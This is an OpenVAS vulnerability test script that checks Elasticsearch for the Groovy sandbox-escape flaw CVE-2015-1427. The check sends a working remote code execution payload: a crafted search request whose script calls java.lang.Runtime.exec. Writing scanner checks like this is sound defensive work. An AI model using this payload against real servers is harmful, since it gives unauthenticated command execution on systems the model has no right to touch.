###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_elastisearch_72585.nasl 11872 2018-10-12 11:22:41Z cfischer $
#
# Elasticsearch Groovy Scripting Engine Unauthenticated Remote Code Execution
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2015 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:elasticsearch:elasticsearch";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105233");
  script_bugtraq_id(72585);
  script_cve_id("CVE-2015-1427");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_version("$Revision: 11872 $");

  script_name("Elasticsearch Groovy Scripting Engine Unauthenticated Remote Code Execution");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/72585");

  script_tag(name:"impact", value:"An attacker can exploit this issue to bypass certain security
restrictions and execute code in the context of this application.");

  script_tag(name:"vuldetect", value:"Send a special crafted HTTP POST request and check the response");

  script_tag(name:"insight", value:"The Groovy scripting engine in Elasticsearch allows remote attackers to bypass
the sandbox protection mechanism and execute arbitrary shell commands via a crafted script.");

  script_tag(name:"solution", value:"Updates are available.");
  script_tag(name:"summary", value:"Elasticsearch is prone to an unauthenticated remote code execution");
  script_tag(name:"affected", value:"Elasticsearch before 1.3.8 and 1.4.x before 1.4.3");
  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"last_modification", value:"$Date: 2018-10-12 13:22:41 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2015-03-12 10:52:20 +0100 (Thu, 12 Mar 2015)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2015 Greenbone Networks GmbH");
  script_dependencies("gb_elastsearch_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 9200);
  script_mandatory_keys("elasticsearch/installed");

  exit(0);
}

include("misc_func.inc");
include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 ); # To have a reference to the Detection-NVT

cmds = exploit_commands();

url = "/_search?pretty";

foreach cmd ( keys( cmds ) )
{
  ex = '{"size":1, "script_fields": {"lupin":{"script": "java.lang.Math.class.forName(\\"java.lang.Runtime\\").getRuntime().exec(\\"' + cmds[ cmd ]  +  '\\").getText()"}}}';
  req = http_post( item:url, port:port, data:ex );
  res = http_keepalive_send_recv( port:port, data:req );
  if( eregmatch( pattern:cmd, string:res ) )
  {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
